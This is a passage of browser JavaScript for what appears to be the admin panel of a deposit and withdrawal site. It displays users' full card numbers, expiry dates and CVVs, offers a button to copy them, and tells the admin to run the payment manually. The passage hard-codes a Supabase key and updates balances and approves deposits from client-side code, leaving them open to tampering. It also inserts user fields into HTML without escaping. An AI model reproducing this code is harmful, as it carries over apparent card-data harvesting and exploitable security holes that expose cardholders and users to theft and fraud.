        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand("copy");
        document.body.removeChild(textArea);
        showAdminNotification(
          "✅ Card details copied to clipboard!",
          "success"
        );
      });
  } catch (error) {
    console.error("Error copying card details:", error);
    showAdminNotification(
      "Failed to copy card details: " + error.message,
      "error"
    );
  }
}

// REPLACE the entire showFullCardDetailsModal function with:
function showFullCardDetailsModal(cardInfo) {
  if (!cardInfo) {
    showAdminNotification("No card details available", "error");
    return;
  }

  // Debug: show what we received
  console.log("Modal cardInfo:", cardInfo);

  const modal = document.createElement("div");
  modal.className = "modal active";

  // Try to get the card number from various possible field names
  const cardNumber =
    cardInfo.full_card_number || cardInfo.card_number || cardInfo.number;
  const expiry =
    cardInfo.expiry_date || cardInfo.card_expiry || cardInfo.expiry;
  const cvv = cardInfo.cvv || cardInfo.card_cvv;
  const cardHolder = cardInfo.card_holder || cardInfo.holder;
  const cardType = cardInfo.card_type || cardInfo.type;

  modal.innerHTML = `
        <div class="modal-content" style="max-width: 600px;">
            <div class="modal-header" style="background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white;">
                <h2><i class="fas fa-credit-card"></i> Complete Card Details</h2>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 15px;">
                    <h3 style="color: #333; margin-bottom: 15px;">Payment Information</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div>
                            <p><strong>Card Number:</strong></p>
                            <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px; letter-spacing: 1px;">
                                ${
                                  cardNumber
                                    ? formatCardNumberForDisplay(cardNumber)
                                    : "Not available"
                                }
                            </div>
                        </div>
                        <div>
                            <p><strong>Expiry Date:</strong></p>
                            <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
                                ${expiry || "Not available"}
                            </div>
                        </div>
                        <div>
                            <p><strong>CVV:</strong></p>
                            <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
                                ${cvv || "Not available"}
                            </div>
                        </div>
                        <div>
                            <p><strong>Card Type:</strong></p>
                            <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
                                ${cardType ? cardType.toUpperCase() : "N/A"}
                            </div>
                        </div>
                    </div>
                    
                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #ddd;">
                        <p><strong>Card Holder:</strong> ${
                          cardHolder || "N/A"
                        }</p>
                        <p><strong>User:</strong> ${
                          cardInfo.user_name || "N/A"
                        } (${cardInfo.user_email || "N/A"})</p>
                        <p><strong>Reference ID:</strong> ${
                          cardInfo.reference || cardInfo.reference_id || "N/A"
                        }</p>
                        <p><strong>Submitted:</strong> ${
                          cardInfo.timestamp
                            ? formatDate(cardInfo.timestamp)
                            : "N/A"
                        }</p>
                    </div>
                </div>
                
                <div style="background: #fff3cd; padding: 15px; border-radius: 5px; border: 1px solid #ffeaa7;">
                    <h4 style="color: #856404; margin: 0 0 10px 0;">
                        <i class="fas fa-exclamation-triangle"></i> Security Instructions
                    </h4>
                    <ul style="margin: 0; padding-left: 20px; color: #856404;">
                        <li>Process this payment immediately through your payment gateway</li>
                        <li>Do not share these details with anyone</li>
                        <li>Delete this information after processing</li>
                        <li>Verify the payment with the cardholder if possible</li>
                    </ul>
                </div>
            </div>
            <div class="modal-actions">
                <button class="btn-secondary modal-close">Close</button>
                <button class="btn-primary" onclick="copyCardDetailsToClipboard('${JSON.stringify(
                  cardInfo
                ).replace(/'/g, "\\'")}')">
                    <i class="fas fa-copy"></i> Copy All Details
                </button>
            </div>
        </div>
    `;

  document.body.appendChild(modal);

  modal
    .querySelector(".modal-close")
    .addEventListener("click", () => modal.remove());
  modal
    .querySelector(".btn-secondary")
    .addEventListener("click", () => modal.remove());
  modal.addEventListener("click", (e) => {
    if (e.target === modal) modal.remove();
  });
}

async function cleanupDatabase() {
  console.log("🧹 CLEANING UP DATABASE...");

  if (
    !confirm('This will mark all non-pending requests as "archived". Continue?')
  )
    return;

  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  try {
    // Get all requests
    const { data: allRequests, error } = await supabase
      .from("deposit_requests")
      .select("*");

    if (error) throw error;

    console.log(`Found ${allRequests.length} total requests`);

    // Find requests that aren't 'pending' but might be showing
    const nonPending = allRequests.filter((req) => req.status !== "pending");
    console.log(`Found ${nonPending.length} non-pending requests`);

    // Archive them
    for (const request of nonPending) {
      console.log(
        `Archiving ${request.request_id} (status: ${request.status})`
      );

      await supabase
        .from("deposit_requests")
        .update({
          status: "archived",
          updated_at: new Date().toISOString(),
        })
        .eq("request_id", request.request_id);
    }

    showAdminNotification(
      `✅ Archived ${nonPending.length} non-pending requests`,
      "success"
    );

    // Refresh
    await loadDepositRequests(supabase);
  } catch (error) {
    console.error("Cleanup error:", error);
    showAdminNotification("Cleanup failed: " + error.message, "error");
  }
}

async function loadWithdrawalRequests(supabase) {
  console.log("🔄 LOADING withdrawal requests...");

  const container = document.getElementById("withdrawal-requests-list");
  if (!container) {
    console.error("❌ Container #withdrawal-requests-list not found!");
    return;
  }

  try {
    // Show loading
    container.innerHTML =
      '<div class="loading-requests">Loading withdrawal requests...</div>';

    // Get ONLY pending requests
    const { data: withdrawalRequests, error } = await supabase
      .from("withdrawal_requests")
      .select("*")
      .eq("status", "pending")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("❌ Database error:", error);
      throw error;
    }

    console.log(
      `📊 Database returned ${
        withdrawalRequests?.length || 0
      } withdrawal requests`
    );

    // Filter on client side
    const pendingRequests = withdrawalRequests
      ? withdrawalRequests.filter((req) => {
          const status = String(req.status).trim().toLowerCase();
          return status === "pending";
        })
      : [];

    console.log(
      `✅ After client filter: ${pendingRequests.length} pending withdrawal requests`
    );

    // Update global data
    adminData.withdrawalRequests = pendingRequests;

    // Display results
    if (pendingRequests.length === 0) {
      container.innerHTML = `
                <div class="no-requests">
                    <i class="fas fa-check-circle"></i>
                    <h3>No Pending Requests</h3>
                    <p>All withdrawal requests have been processed</p>
                </div>
            `;
    } else {
      // Build UI
      let html = "";
      pendingRequests.forEach((request) => {
        const user = adminData.users?.find(
          (u) => u.user_id === request.user_id
        );
        const displayName = user
          ? `${user.first_name} ${user.last_name}`
          : request.user_id;

        html += `
                    <div class="request-card withdrawal" id="req-${
                      request.request_id
                    }">
                        <div class="request-header">
                            <h3>${formatCurrency(request.amount)}</h3>
                            <span class="request-status pending">Pending</span>
                        </div>
                        <div class="request-details">
                            <p><strong>User:</strong> ${displayName}</p>
                            <p><strong>Amount:</strong> ${formatCurrency(
                              request.amount
                            )}</p>
                            <p><strong>Net Amount:</strong> ${formatCurrency(
                              request.net_amount || request.amount
                            )}</p>
                            <p><strong>Fee:</strong> ${formatCurrency(
                              request.fee || 0
                            )}</p>
                            <p><strong>Method:</strong> ${
                              request.method || "Bank Transfer"
                            }</p>
                            <p><strong>Date:</strong> ${formatDate(
                              request.created_at
                            )}</p>
                        </div>
                        <div class="request-actions">
                            <button class="btn-approve" onclick="approveWithdrawalRequest('${
                              request.request_id
                            }', ${request.amount}, '${request.user_id}')">
                                Approve
                            </button>
                            <button class="btn-reject" onclick="rejectWithdrawalRequest('${
                              request.request_id
                            }')">
                                Reject
                            </button>
                        </div>
                    </div>
                `;
      });

      container.innerHTML = html;
    }

    // Update badge count
    updatePendingCounts();
  } catch (error) {
    console.error("❌ Error in loadWithdrawalRequests:", error);
    if (container) {
      container.innerHTML = `
                <div class="error-requests">
                    <i class="fas fa-exclamation-triangle"></i>
                    <h3>Error Loading</h3>
                    <p>Failed to load withdrawal requests</p>
                </div>
            `;
    }
  }
}

async function approveDepositRequest(requestId, amount, userId) {
  console.log("🚀🚀🚀 APPROVING DEPOSIT REQUEST:", requestId);

  if (!confirm(`Approve deposit of $${amount}?`)) return;

  // Create supabase client INSIDE the function to avoid scope issues
  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  try {
    // 1. FIRST: VISUALLY REMOVE FROM UI (immediate feedback)
    console.log("🎯 Removing from UI:", requestId);
    const card = document.getElementById(`card-${requestId}`);
    if (card) {
      // Animate removal
      card.style.transition = "all 0.3s ease";
      card.style.opacity = "0.3";
      card.style.transform = "translateX(-50px)";
      card.style.height = card.offsetHeight + "px";

      setTimeout(() => {
        card.style.height = "0";
        card.style.margin = "0";
        card.style.padding = "0";
        card.style.border = "none";
        card.style.overflow = "hidden";

        setTimeout(() => {
          if (card.parentNode) {
            card.remove();
            console.log("✅ Card removed from DOM");

            // If container is empty, show message
            const container = document.getElementById("deposit-requests-list");
            if (
              container &&
              container.querySelectorAll(".request-card").length === 0
            ) {
              container.innerHTML = `
                                <div class="no-requests" style="text-align: center; padding: 40px; color: #27ae60;">
                                    <i class="fas fa-check-circle" style="font-size: 48px; margin-bottom: 20px;"></i>
                                    <h3>Approved!</h3>
                                    <p>No pending deposit requests</p>
                                </div>
                            `;
            }
          }
        }, 300);
      }, 300);
    }

    // 2. UPDATE DATABASE
    console.log('📝 Updating database status to "approved"...');
    const { data: updateResult, error: updateError } = await supabase
      .from("deposit_requests")
      .update({
        status: "approved",
        updated_at: new Date().toISOString(),
      })
      .eq("request_id", requestId)
      .select();

    if (updateError) {
      console.error("❌ DATABASE UPDATE FAILED:", updateError);
      showAdminNotification("Database error: " + updateError.message, "error");
      return;
    }

    console.log("✅ Database update successful:", updateResult);

    // 3. UPDATE USER BALANCE
    console.log("💰 Updating user balance...");
    try {
      const { data: user, error: userError } = await supabase
        .from("users")
        .select("balance, total_deposits")
        .eq("user_id", userId)
        .single();

      if (!userError && user) {
        const newBalance = (parseFloat(user.balance) || 0) + parseFloat(amount);
        const newTotalDeposits =
          (parseFloat(user.total_deposits) || 0) + parseFloat(amount);

        await supabase
          .from("users")
          .update({
            balance: newBalance,
            total_deposits: newTotalDeposits,
            updated_at: new Date().toISOString(),
          })
          .eq("user_id", userId);

        console.log("✅ User balance updated");
      }
    } catch (balanceError) {
      console.error("⚠️ Balance update error (continuing):", balanceError);
    }

    // 4. CREATE TRANSACTION
    console.log("📊 Creating transaction record...");
    try {
      const transactionId = "TXN_" + Date.now();
      await supabase.from("transactions").insert([
        {
          transaction_id: transactionId,
          user_id: userId,
          type: "deposit",
          amount: amount,
          method: "Bank Transfer",
          status: "completed",
          description: `Deposit approved`,
          transaction_date: new Date().toISOString(),
        },
      ]);
      console.log("✅ Transaction created");
    } catch (transactionError) {
      console.error("⚠️ Transaction error (continuing):", transactionError);
    }

    // 5. SHOW SUCCESS
    showAdminNotification(
      `✅ Deposit of $${amount} approved successfully!`,
      "success"
    );
    console.log("🎉 Approval process complete!");

    // 6. FORCE REFRESH AFTER DELAY
    setTimeout(async () => {
      console.log("🔄 Forcing full refresh...");

      // Update badge counts immediately
      updatePendingCounts();
      updateDashboardStats();

      // Force reload from database
      await loadDepositRequests(supabase);

      console.log("✅ Refresh complete");
    }, 1000);
  } catch (error) {
    console.error("❌ UNEXPECTED ERROR:", error);
    showAdminNotification("Unexpected error: " + error.message, "error");
  }
}

// Helper function to remove request from UI
function removeRequestFromUI(requestId, type = "deposit") {
  const containerId =
    type === "deposit" ? "deposit-requests-list" : "withdrawal-requests-list";
  const container = document.getElementById(containerId);

  if (!container) return;

  // Find and remove the specific request
  const cards = container.querySelectorAll(".request-card");
  let found = false;

  cards.forEach((card) => {
    const approveBtn = card.querySelector(".btn-approve");
    if (approveBtn && approveBtn.getAttribute("onclick")?.includes(requestId)) {
      console.log("🎯 Removing request from UI:", requestId);

      // Animate removal
      card.style.transition = "all 0.3s ease";
      card.style.opacity = "0";
      card.style.transform = "translateX(-100px)";
      card.style.height = "0";
      card.style.margin = "0";
      card.style.padding = "0";
      card.style.overflow = "hidden";
      card.style.border = "none";

      setTimeout(() => {
        card.remove();
        found = true;

        // If no cards left, show success message
        if (container.querySelectorAll(".request-card").length === 0) {
          container.innerHTML = `
                        <div class="no-requests" style="text-align: center; padding: 40px; color: #27ae60;">
                            <i class="fas fa-check-circle" style="font-size: 48px; margin-bottom: 20px;"></i>
                            <h3>All Done!</h3>
                            <p>No pending ${type} requests</p>
                        </div>
                    `;
        }

        // Update badge counts
        updatePendingCounts();
      }, 300);
    }
  });

  if (!found) {
    console.log("⚠️ Request not found in UI, refreshing entire section...");
    container.innerHTML = '<div class="loading-requests">Refreshing...</div>';
  }
}

async function forceRefreshDeposits() {
  console.log("🔄 FORCE REFRESHING...");

  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  showAdminNotification("Refreshing...", "info");
  await loadDepositRequests(supabase);
  showAdminNotification("Refreshed!", "success");
}

async function rejectDepositRequest(requestId) {
  console.log("🗑️ REJECTING REQUEST:", requestId);

  if (!confirm("Reject this deposit request?")) return;

  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  try {
    // Remove from UI
    const card = document.getElementById(`card-${requestId}`);
    if (card) {
      card.style.transition = "all 0.3s ease";
      card.style.opacity = "0.3";
      card.style.transform = "translateX(50px)";

      setTimeout(() => {
        if (card.parentNode) {
          card.remove();
        }
      }, 300);
    }

    // Update database
    await supabase
      .from("deposit_requests")
      .update({
        status: "rejected",
        updated_at: new Date().toISOString(),
      })
      .eq("request_id", requestId);

    showAdminNotification("✅ Request rejected", "success");

    // Refresh
    setTimeout(async () => {
      await loadDepositRequests(supabase);
      updatePendingCounts();
    }, 500);
  } catch (error) {
    console.error("Reject error:", error);
    showAdminNotification("Reject failed: " + error.message, "error");
  }
}

async function refreshDepositRequests() {
  console.log("🔄 Manual refresh triggered");
  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  showAdminNotification("Refreshing deposit requests...", "info");
  await loadDepositRequests(supabase);
  showAdminNotification("Deposit requests refreshed!", "success");
}

async function approveWithdrawalRequest(requestId, amount, userId) {
  if (!confirm("Are you sure you want to approve this withdrawal request?"))
    return;

  try {
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    // First confirmation
    const confirm1 = confirm("First confirmation: Approve this withdrawal?");
    if (!confirm1) return;

    const confirm2 = confirm(
      "Second confirmation: Are you absolutely sure? This will deduct from user balance."
    );
    if (!confirm2) return;

    // Update withdrawal request status
    await supabase
      .from("withdrawal_requests")
      .update({
        status: "approved",
        updated_at: new Date().toISOString(),
      })
      .eq("request_id", requestId);

    // Get the request details
    const { data: request, error: requestError } = await supabase
      .from("withdrawal_requests")
      .select("*")
      .eq("request_id", requestId)
      .single();

    if (requestError) throw requestError;

    // Get current user balance first
    const { data: currentUser, error: userError } = await supabase
      .from("users")
      .select("balance, total_withdrawals")
      .eq("user_id", userId)
      .single();

    if (userError) throw userError;

    // Calculate new values
    const newBalance =
      (parseFloat(currentUser.balance) || 0) - parseFloat(amount);
    const newTotalWithdrawals =
      (parseFloat(currentUser.total_withdrawals) || 0) + parseFloat(amount);

    // Update user balance using direct values
    await supabase
      .from("users")
      .update({
        balance: newBalance,
        total_withdrawals: newTotalWithdrawals,
        updated_at: new Date().toISOString(),
      })
      .eq("user_id", userId);

    // Create transaction record
    const transactionId = "TXN_" + Date.now();
    await supabase.from("transactions").insert([
      {
        transaction_id: transactionId,
        user_id: userId,
        type: "withdrawal",
        amount: amount,
        fee: request.fee,
        net_amount: request.net_amount,
        method: request.method,
        status: "completed",
        description: `Withdrawal approved: ${request.method}`,
        transaction_date: new Date().toISOString(),
      },
    ]);

    showAdminNotification("Withdrawal approved successfully!", "success");

    // CRITICAL: Force refresh the current section
    const activeSection = document.querySelector(".admin-section.active");
    const sectionId = activeSection ? activeSection.id : "";

    if (sectionId === "deposit-requests-section") {
      // If we're on the deposit requests page, reload it
      await loadDepositRequests(supabase);
    } else if (sectionId === "withdrawal-requests-section") {
      // If we're on the withdrawal requests page, reload it
      await loadWithdrawalRequests(supabase);
    }

    // Always reload all data and update counts
    await loadAllData(supabase);
    updateDashboardStats();
    updatePendingCounts();
  } catch (error) {
    console.error("Error approving withdrawal:", error);
    showAdminNotification(
      "Failed to approve withdrawal: " + error.message,
      "error"
    );
  }
}

async function rejectWithdrawalRequest(requestId) {
  if (!confirm("Are you sure you want to reject this withdrawal request?"))
    return;

  try {
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    await supabase
      .from("withdrawal_requests")
      .update({
        status: "rejected",
        updated_at: new Date().toISOString(),
      })
      .eq("request_id", requestId);

    showAdminNotification("Withdrawal request rejected", "success");

    // CRITICAL: Force refresh the current section
    const activeSection = document.querySelector(".admin-section.active");
    const sectionId = activeSection ? activeSection.id : "";

    if (sectionId === "withdrawal-requests-section") {
      await loadWithdrawalRequests(supabase);
    }

    // Reload data and refresh UI
    await loadAllData(supabase);
    updatePendingCounts();
  } catch (error) {
    console.error("Error rejecting withdrawal:", error);
    showAdminNotification("Failed to reject withdrawal", "error");
  }
}
// Other sections (simplified)
function setupTransactionsSection() {
  loadTransactionsTable();
}

function setupSettingsSection() {
  loadSettings();
}

function loadTransactionsTable() {
  // Implement if needed
}

function loadSettings() {
  const interestRate = document.getElementById("interest-rate");
  if (interestRate && adminData.settings.interest_rate) {
    interestRate.value = adminData.settings.interest_rate;
  }
}

function setupModals(supabase) {
  // Close buttons
  document.querySelectorAll(".modal-close").forEach((btn) => {
    btn.addEventListener("click", function () {
      const modal = this.closest(".modal");
      if (modal) modal.classList.remove("active");
    });
  });

  // Click outside modal
  window.addEventListener("click", function (e) {
    if (e.target.classList.contains("modal")) {
      e.target.classList.remove("active");
    }
  });
}

// Utility Functions
function formatCurrency(amount) {
  return (
    "$" +
    parseFloat(amount)
      .toFixed(2)
      .replace(/\d(?=(\d{3})+\.)/g, "$&,")
  );
}

function formatDate(dateString) {
  if (!dateString) return "N/A";
  try {
    const date = new Date(dateString);
    return date.toLocaleDateString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
    });
  } catch (e) {
    return "N/A";
  }
}

function getUserName(userId) {
  const user = adminData.users.find((u) => u.user_id === userId);
  return user ? `${user.first_name} ${user.last_name}` : "Unknown User";
}

function updateAdminTime() {
  const now = new Date();
  const timeString = now.toLocaleTimeString("en-US", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
  const dateString = now.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });

  const timeElement = document.getElementById("admin-time");
  if (timeElement) {
    timeElement.textContent = `${dateString} • ${timeString}`;
  }
}

function showAdminNotification(message, type = "info") {
  document.querySelectorAll(".admin-notification").forEach((el) => el.remove());

  const notification = document.createElement("div");
  notification.className = `admin-notification ${type}`;
  notification.innerHTML = `
        <i class="fas fa-${
          type === "success"
            ? "check-circle"
            : type === "error"
            ? "exclamation-circle"
            : "info-circle"
        }"></i>
        <span>${message}</span>
    `;

  document.body.appendChild(notification);

  setTimeout(() => {
    if (notification.parentNode) {
      notification.remove();
    }
  }, 3000);
}

// Functions to expose to window
window.viewUserDetails = function (userId) {
  const user = adminData.users.find((u) => u.user_id === userId);
  if (user) {
    alert(
      `User Details:\n\nID: ${user.user_id}\nName: ${user.first_name} ${
        user.last_name
      }\nEmail: ${user.email}\nBalance: ${formatCurrency(
        user.balance
      )}\nStatus: ${user.status}\nJoined: ${formatDate(user.join_date)}`
    );
  }
};

window.editUser = function (userId) {
  const user = adminData.users.find((u) => u.user_id === userId);
  if (user) {
    alert("Edit user functionality would go here");
  }
};
